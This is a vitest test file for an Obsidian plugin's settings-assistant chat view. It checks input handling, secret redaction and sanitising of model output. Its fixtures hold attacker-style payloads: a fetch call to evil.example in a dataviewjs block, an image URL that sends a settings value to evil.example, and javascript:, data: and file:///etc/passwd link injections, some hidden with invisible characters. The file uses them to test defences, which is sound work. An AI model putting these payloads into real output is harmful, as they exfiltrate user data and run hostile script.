import { describe, expect, it, vi } from "vitest";
import "../src/i18n/strings";
import { WorkspaceLeaf, makeFakeEl } from "./vendor/kit/obsidian-mock";
import { ChatSession, type ChatSessionDeps } from "../src/obsidian/chat-session";
import { SettingsChatView, VIEW_TYPE_SA_CHAT, refreshChatViews, stripActiveContent, type ChatViewDeps } from "../src/obsidian/chat-view";

const installed = [{ id: "koda-agent", name: "Koda" }, { id: "lingotuner", name: "Lingotuner" }];
const profileAnswer = "Try this:\n```settings-profile\n" + JSON.stringify({ version: 1, plugins: { "koda-agent": { maxRounds: 20 } } }) + "\n```\nDone.";
const broken = "```settings-profile\n{oops sk-DETAIL-LEAK\n```";

function setup(opts: { endpoint?: boolean; answer?: string; send?: ChatSessionDeps["send"]; readSettings?: ChatSessionDeps["readSettings"] } = {}) {
  const flag = { ok: opts.endpoint ?? true };
  const send: ChatSessionDeps["send"] = opts.send ?? (async (_m, _s, onDelta) => { onDelta({ content: "hi" }); return { ok: true, content: opts.answer ?? "plain answer" }; });
  const session = new ChatSession({
    send, installed: () => installed, describeEndpoint: () => ({ endpoint: "http://x", model: "m1" }),
    readSettings: opts.readSettings ?? (async () => JSON.stringify({ apiKey: "sk-SECRET-VALUE", maxRounds: 5 })),
  });
  const service = { plan: vi.fn(async () => []), applyInteractive: vi.fn(async () => ({ cancelled: true as const })) };
  const deps: ChatViewDeps = {
    session, service, installed: () => installed,
    resolveEndpoint: async () => flag.ok,
    openOwnSettings: vi.fn(), openPluginSettings: vi.fn(),
    renderMarkdown: vi.fn(async (el: HTMLElement, md: string) => { el.setText(md); }),
    saveNote: vi.fn(async () => "Settings profile.md"),
    thinking: { family: () => null, current: () => "off", onLevel: () => "low", setLevel: async () => {}, levelPicker: () => false,
      strings: { button: () => "Thinking: off", level: (l) => l, pickerLabel: "Thinking level" } },
    now: () => new Date(2026, 9, 3, 12, 0),
  };
  const view = new SettingsChatView(new WorkspaceLeaf() as never, deps);
  return { view, deps, session, service, flag };
}
const buttons = (v: SettingsChatView) => (v.contentEl as any).querySelectorAll("button") as any[];
const ask = async (v: SettingsChatView, text = "koda-agent rounds") => {
  const input = (v.contentEl as any).querySelectorAll("textarea")[0];
  input.value = text;
  await v.submit();
};

describe("chat-view", () => {
  it("Typ-Konstante", () => { expect(VIEW_TYPE_SA_CHAT).toBe("settings-assistant-chat"); });

  it("Enter sendet, Umschalt+Enter macht eine neue Zeile, Strg/Cmd+Enter sendet weiter; eine Eingabe per IME sendet nie", async () => {
    const taste = async (mods: { shiftKey?: boolean; metaKey?: boolean; ctrlKey?: boolean; altKey?: boolean; isComposing?: boolean; key?: string }) => {
      const { view, deps } = setup({ answer: "ok" });
      await view.onOpen();
      const input = (view.contentEl as any).querySelectorAll("textarea")[0];
      input.value = "koda-agent rounds";
      const ev = { type: "keydown", key: "Enter", shiftKey: false, metaKey: false, ctrlKey: false, altKey: false, isComposing: false, defaultPrevented: false, preventDefault() { this.defaultPrevented = true; }, ...mods };
      input.dispatchEvent(ev);
      await Promise.resolve(); await Promise.resolve();
      return { sent: input.value === "" || (view.contentEl as any).textContent.includes("You"), prevented: ev.defaultPrevented, deps };
    };
    expect((await taste({})).prevented).toBe(true);
    expect((await taste({ metaKey: true })).prevented).toBe(true);
    expect((await taste({ ctrlKey: true })).prevented).toBe(true);
    expect((await taste({ shiftKey: true })).prevented).toBe(false);   // neue Zeile
    expect((await taste({ altKey: true })).prevented).toBe(false);
    expect((await taste({ isComposing: true })).prevented).toBe(false);   // Enter bestätigt die Umwandlung
    expect((await taste({ key: "a" })).prevented).toBe(false);
  });

  it("Empty-State ohne Endpunkt: genau ein mod-cta, der die Einstellungen öffnet", async () => {
    const { view, deps } = setup({ endpoint: false });
    await view.onOpen();
    const el = view.contentEl as any;
    expect(el.querySelectorAll(".sa-empty").length).toBe(1);
    const cta = el.querySelectorAll(".mod-cta");
    expect(cta.length).toBe(1);
    expect(cta[0].textContent).toBe("Set up a chat model");
    cta[0].click();
    expect(deps.openOwnSettings).toHaveBeenCalled();
  });

  it("Sent context enthält Namen, aber keinen geheimen Wert", async () => {
    const { view } = setup();
    await view.onOpen();
    await ask(view);
    const text = (view.contentEl as any).textContent as string;
    expect(text).toContain("Sent context");
    expect(text).toContain("plugins.koda-agent.apiKey");
    expect(text).not.toContain("sk-SECRET-VALUE");
    expect(text).toContain("http://x");
  });

  it("jede Runde traegt einen Rollenkopf als Text: You und Assistant", async () => {
    const { view } = setup({ answer: "plain answer" });
    await view.onOpen();
    await ask(view);
    await vi.waitFor(() => { expect((view.contentEl as any).querySelectorAll(".sa-chat-role").length).toBe(2); });
    const roles = (view.contentEl as any).querySelectorAll(".sa-chat-role").map((r: any) => r.textContent);
    expect(roles).toEqual(["You", "Assistant"]);
  });

  it("ein Vorschlagsblock rendert den Apply-Knopf und die Speichern-Aktion", async () => {
    const { view, deps } = setup({ answer: profileAnswer });
    await view.onOpen();
    await ask(view);
    await vi.waitFor(() => { expect((view.contentEl as any).querySelectorAll(".sa-apply").length).toBe(1); });
    const el = view.contentEl as any;
    expect(el.querySelectorAll(".sa-apply")[0].textContent).toContain("Apply");
    const save = buttons(view).find((b) => b.textContent === "Save as profile note");
    expect(save).toBeTruthy();
    // Der Block steht nicht noch einmal als Rohtext im Markdown.
    expect((deps.renderMarkdown as any).mock.calls.at(-1)[1]).not.toContain("settings-profile");
    save.click();
    await vi.waitFor(() => { expect(deps.saveNote).toHaveBeenCalled(); });
  });

  it("(I2) fremde Codeblock-Tags und Inline-Abfragen erreichen den Renderer nicht", async () => {
    const F = "`".repeat(3);
    const evil = `Look:\n${F}dataviewjs\nfetch("https://evil.example")\n${F}\nand \`$= dv.pages()\`\n${F} settings-profile\n{"version":1}\n${F}`;
    const { view, deps } = setup({ answer: evil });
    await view.onOpen();
    await ask(view);
    await vi.waitFor(() => { expect((deps.renderMarkdown as any).mock.calls.length).toBeGreaterThan(0); });
    const md = (deps.renderMarkdown as any).mock.calls.at(-1)[1] as string;
    // Kein Backtick mehr: weder Zaun noch Inline-Code kann entstehen; der Profilblock ist vorher aus dem Rohtext gezogen.
    expect(md).not.toContain("`");
    expect(md).toContain("\u02CB\u02CB\u02CBdataviewjs");
    expect(md).not.toContain("settings-profile");
  });

  it("Speichern schwärzt Geheimnisse im Block", async () => {
    const leaky = "```settings-profile\n" + JSON.stringify({ version: 1, plugins: { "koda-agent": { apiKey: "sk-LLM-MADE" } } }) + "\n```";
    const { view, deps } = setup({ answer: leaky });
    await view.onOpen();
    await ask(view);
    await vi.waitFor(() => { expect(buttons(view).some((b) => b.textContent === "Save as profile note")).toBe(true); });
    buttons(view).find((b) => b.textContent === "Save as profile note").click();
    await vi.waitFor(() => { expect(deps.saveNote).toHaveBeenCalled(); });
    const [name, text] = (deps.saveNote as any).mock.calls[0];
    expect(name).toBe("Settings profile 2026-10-03 12-00");
    expect(text).not.toContain("sk-LLM-MADE");
  });

  it("(I4) gültiger Block: roher Block geschwärzt im <details>, kein Geheimnis", async () => {
    const leaky = "```settings-profile\n" + JSON.stringify({ version: 1, plugins: { "koda-agent": { apiKey: "sk-LLM-MADE", maxRounds: 20 } } }) + "\n```";
    const { view } = setup({ answer: leaky });
    await view.onOpen();
    await ask(view);
    await vi.waitFor(() => { expect((view.contentEl as any).querySelectorAll(".sa-chat-raw").length).toBe(1); });
    const raw = (view.contentEl as any).querySelectorAll(".sa-chat-raw")[0];
    expect(raw.tagName.toLowerCase()).toBe("details");
    expect(raw.textContent).toContain("Raw block (secrets redacted)");
    const pre = raw.querySelectorAll("pre")[0];
    expect(pre.textContent).toContain("🔒");
    expect(pre.textContent).toContain("maxRounds");
    expect((view.contentEl as any).textContent).not.toContain("sk-LLM-MADE");
  });

  it("(I4) ungültiger Block: Hinweis statt Rohtext", async () => {
    const { view } = setup({ answer: broken });
    await view.onOpen();
    await ask(view);
    await vi.waitFor(() => { expect((view.contentEl as any).querySelectorAll(".sa-chat-raw").length).toBe(1); });
    const pre = (view.contentEl as any).querySelectorAll(".sa-chat-raw")[0].querySelectorAll("pre")[0];
    expect(pre.textContent).toBe("(block is not valid JSON — not shown)");
    const text = (view.contentEl as any).textContent as string;
    expect(text).not.toContain("oops");
    expect(text).not.toContain("sk-DETAIL-LEAK");
  });

  it("(I4) gültiges JSON, aber kein gültiges Profil: geschwärzt gezeigt", async () => {
    const { view } = setup({ answer: "```settings-profile\n" + JSON.stringify({ plugins: { x: { token: "sk-NOVERSION" } } }) + "\n```" });
    await view.onOpen();
    await ask(view);
    await vi.waitFor(() => { expect((view.contentEl as any).querySelectorAll(".sa-chat-raw").length).toBe(1); });
    const pre = (view.contentEl as any).querySelectorAll(".sa-chat-raw")[0].querySelectorAll("pre")[0];
    expect(pre.textContent).toContain("🔒");
    expect((view.contentEl as any).textContent).not.toContain("sk-NOVERSION");
  });

  it("Chips sind entfernbar", async () => {
    const { view, session } = setup();
    await view.onOpen();
    session.selected = ["koda-agent", "lingotuner"];
    view.refresh();
    const rm = buttons(view).filter((b) => b.getAttribute("aria-label") === "Remove Koda");
    expect(rm.length).toBe(1);
    rm[0].click();
    expect(session.selected).toEqual(["lingotuner"]);
  });

  it("die laufende Antwort wird einmal gebaut und danach fortgeschrieben, nicht je Stück neu aufgebaut", async () => {
    let view: SettingsChatView | undefined;
    const seen: unknown[] = [];
    const streams = () => (view!.contentEl as any).querySelectorAll(".sa-chat-stream") as any[];
    const send: ChatSessionDeps["send"] = async (_m, _s, onDelta) => {
      onDelta({ content: "a" }); seen.push(streams()[0]);
      onDelta({ content: "ab" }); seen.push(streams()[0]);
      onDelta({ reasoning: "denkt" }); seen.push(streams()[0]);
      return { ok: true, content: "ab" };
    };
    const made = setup({ send });
    view = made.view;
    await view.onOpen();
    await ask(view);
    expect(seen[0]).toBeDefined();
    expect(seen[1]).toBe(seen[0]);
    expect(seen[2]).toBe(seen[0]);
    expect(((seen[0] as any).textContent as string)).toContain("ab");
    await vi.waitFor(() => { expect(streams().length).toBe(1); });
  });

  it("Abbrechen ruft den AbortController", async () => {
    let captured: AbortSignal | null = null;
    const send: ChatSessionDeps["send"] = (_m, signal) => new Promise((resolve) => { captured = signal; signal.addEventListener("abort", () => { resolve({ ok: false, error: "aborted" }); }); });
    const { view } = setup({ send });
    await view.onOpen();
    const pending = ask(view);
    await vi.waitFor(() => { expect(captured).not.toBeNull(); });
    const stop = buttons(view).find((b) => b.textContent === "Stop");
    expect(stop).toBeTruthy();
    stop.click();
    await pending;
    expect(captured!.aborted).toBe(true);
    expect((view.contentEl as any).textContent).toContain("Stopped.");
  });

  it("ein ungültiger Block zeigt nur den Code-Text, nie das Detail", async () => {
    const { view } = setup({ answer: broken });
    await view.onOpen();
    await ask(view);
    await vi.waitFor(() => { expect((view.contentEl as any).querySelectorAll(".sa-profile-error").length).toBe(1); });
    const text = (view.contentEl as any).textContent as string;
    expect(text).toContain("not valid JSON");
    expect(text).not.toContain("sk-DETAIL-LEAK");
  });

  it("ein Sendefehler zeigt den Fehlertext, wendet nichts an", async () => {
    const { view, service } = setup({ send: async () => ({ ok: false, error: "http 500" }) });
    await view.onOpen();
    await ask(view);
    expect((view.contentEl as any).textContent).toContain("Error: http 500");
    expect(service.applyInteractive).not.toHaveBeenCalled();
  });

  it("Empty-State wechselt nach Endpunkt-Auflösung in die Eingabe; refreshChatViews erreicht alle offenen Views", async () => {
    const { view, flag } = setup({ endpoint: false });
    await view.onOpen();
    expect((view.contentEl as any).querySelectorAll("textarea").length).toBe(0);
    flag.ok = true;
    const leaf = new WorkspaceLeaf() as any;
    leaf.view = view;
    await refreshChatViews([leaf, new WorkspaceLeaf() as never]);
    expect((view.contentEl as any).querySelectorAll("textarea").length).toBe(1);
    expect((view.contentEl as any).querySelectorAll(".sa-empty").length).toBe(0);
  });

  it("reload bei unverändertem Endpunkt-Zustand baut nur die Denk-Steuerung neu auf, der Entwurf bleibt", async () => {
    const { view, deps } = setup();
    let label = "Thinking: off";
    (deps.thinking as any).strings.button = () => label;
    await view.onOpen();
    const input = (view.contentEl as any).querySelectorAll("textarea")[0];
    input.value = "halber Entwurf";
    expect((view.contentEl as any).textContent).toContain("Thinking: off");
    label = "Thinking: low";
    await view.reload();
    expect((view.contentEl as any).textContent).toContain("Thinking: low");
    expect((view.contentEl as any).querySelectorAll("textarea")[0]).toBe(input);
    expect(input.value).toBe("halber Entwurf");
  });

  it("Bild-URL in der Antwort erreicht den Renderer nie als Bildsyntax", async () => {
    const { view, deps } = setup({ answer: "look ![x](https://evil.example/?q=maxRounds5) <img src=\"https://evil.example/a\">" });
    await view.onOpen();
    await ask(view);
    await vi.waitFor(() => { expect(deps.renderMarkdown).toHaveBeenCalled(); });
    const md = (deps.renderMarkdown as any).mock.calls.at(-1)[1] as string;
    expect(md).not.toContain("![");
    expect(md).not.toContain("<img");
    const text = (view.contentEl as any).textContent as string;
    expect(text).not.toContain("![");
  });

  it("ein unvollständiger Profilzaun wird nicht gerendert", async () => {
    const { view, deps } = setup({ answer: "hi\n```settings-profile\n{\"version\":1" });
    await view.onOpen();
    await ask(view);
    await vi.waitFor(() => { expect(deps.renderMarkdown).toHaveBeenCalled(); });
    expect((deps.renderMarkdown as any).mock.calls.at(-1)[1]).not.toContain("settings-profile");
  });

  it("(I2) ein nicht erkannter Profilzaun (im Zitat) wird nie ein Block des eigenen Prozessors", async () => {
    const { view, deps } = setup({ answer: "hi\n> ```settings-profile\n> {\"version\":1}\n> ```" });
    await view.onOpen();
    await ask(view);
    await vi.waitFor(() => { expect(deps.renderMarkdown).toHaveBeenCalled(); });
    expect((deps.renderMarkdown as any).mock.calls.at(-1)[1]).not.toContain("`");
  });

  it("stripActiveContent entfernt aktive Elemente und src/srcset", () => {
    const root = makeFakeEl();
    const img = root.createEl("img", { attr: { src: "https://evil/" } });
    const wrap = root.createDiv();
    wrap.createEl("iframe"); wrap.createEl("svg"); wrap.createEl("source");
    const a = wrap.createEl("a", { attr: { src: "https://x", srcset: "y" } });
    stripActiveContent(root);
    expect(root.querySelectorAll("img, iframe, svg, source, script, video").length).toBe(0);
    expect(root.children).not.toContain(img);
    expect(a.getAttribute("src")).toBeNull();
    expect(a.getAttribute("srcset")).toBeNull();
  });

  describe("stripActiveContent: Links (N1)", () => {
    const hrefAfter = (attr: Record<string, string>): string | null => {
      const root = makeFakeEl();
      const a = root.createEl("a", { text: "click", attr });
      stripActiveContent(root);
      expect(a.getText?.() ?? "click").toBe("click"); // Linktext bleibt sichtbar
      return a.getAttribute("href");
    };
    it.each([
      "javascript:alert(1)", "JavaScript:alert(1)", "JaVaScRiPt:alert(1)", "  javascript:alert(1)", "\tjava\nscript:alert(1)", "\u0001javascript:alert(1)",
      "data:text/html,<b>x</b>", "vbscript:msgbox(1)", "obsidian://open?vault=x", "file:///etc/passwd", "app://obsidian.md/x", "OBSIDIAN://x", "ftp://x/y",
    ])("%j verliert sein href", (href) => { expect(hrefAfter({ href })).toBeNull(); });
    it.each(["https://example.org/x", "HTTP://example.org", "mailto:a@b.de", "#Überschrift", "Notiz.md", "folder/Notiz.md#h", "?q=1"])("%j bleibt", (href) => {
      expect(hrefAfter({ href })).toBe(href);
    });
    it("interner Obsidian-Link (data-href) bleibt, auch bei Doppelpunkt im Namen", () => {
      expect(hrefAfter({ href: "Titel: Untertitel", "data-href": "Titel: Untertitel" })).toBe("Titel: Untertitel");
    });
    it("data-href macht ein javascript:-Ziel nicht harmlos", () => {
      expect(hrefAfter({ href: "javascript:alert(1)", "data-href": "x" })).toBeNull();
    });
    it("data-href ist eine Pauschal-Ausnahme: ein interner Link mit obsidian://-Ziel behält sein href (so festgehalten, nicht empfohlen)", () => {
      expect(hrefAfter({ href: "obsidian://open?vault=x", "data-href": "x" })).toBe("obsidian://open?vault=x");
    });
    it.each(["java\u200bscript:alert(1)", "\u200bjavascript:alert(1)", "java\u200dscript:alert(1)", "\ufeffjavascript:alert(1)", "java\u0085script:alert(1)", "java\u007fscript:alert(1)"])(
      "unsichtbare Zeichen im Schema (%j) verstecken es nicht", (href) => { expect(hrefAfter({ href })).toBeNull(); });
    it("verschachtelte Links werden alle geprüft", () => {
      const root = makeFakeEl();
      const a = root.createDiv().createEl("p").createEl("a", { attr: { href: "data:x" } });
      stripActiveContent(root);
      expect(a.getAttribute("href")).toBeNull();
    });
  });

  it("der Renderer-Ausgang wird nach dem Rendern bereinigt", async () => {
    const { view, deps } = setup({ answer: "hello" });
    (deps.renderMarkdown as any).mockImplementation(async (el: any) => { el.createEl("img", { attr: { src: "https://evil/" } }); });
    await view.onOpen();
    await ask(view);
    await vi.waitFor(() => { expect(deps.renderMarkdown).toHaveBeenCalled(); });
    await new Promise((r) => setTimeout(r, 0));
    expect((view.contentEl as any).querySelectorAll("img").length).toBe(0);
  });
});
